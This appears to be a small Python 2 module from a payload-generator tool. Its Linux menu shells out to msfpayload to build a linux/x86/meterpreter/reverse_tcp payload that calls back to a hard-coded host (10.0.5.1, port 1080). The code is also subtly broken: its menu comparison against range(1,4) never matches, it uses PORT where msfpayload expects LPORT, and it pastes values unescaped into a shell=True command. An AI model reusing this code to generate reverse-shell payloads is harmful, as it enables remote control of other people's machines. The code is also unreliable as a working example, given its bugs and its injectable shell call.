#!/usr/bin/python
#

from src.core.main import *
from src.core.menus import *
import subprocess as subp

def msfGen(payload, ip, port, outfile):
	proc = subp.Popen("msfpayload %s LHOST=%s PORT=%s X > output/%s" % (payload, ip, port, outfile),
						shell=True, stdout=subp.PIPE)

while 1:
	try:
		clear()
		linux_menu()
		selection = raw_input(" %sSelection > %s" % (main.colours.bold, main.colours.reset))
		if selection == range(1,4):
			msfGen("linux/x86/meterpreter/reverse_tcp", "10.0.5.1", "1080", "paygen-pl")

		# Return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
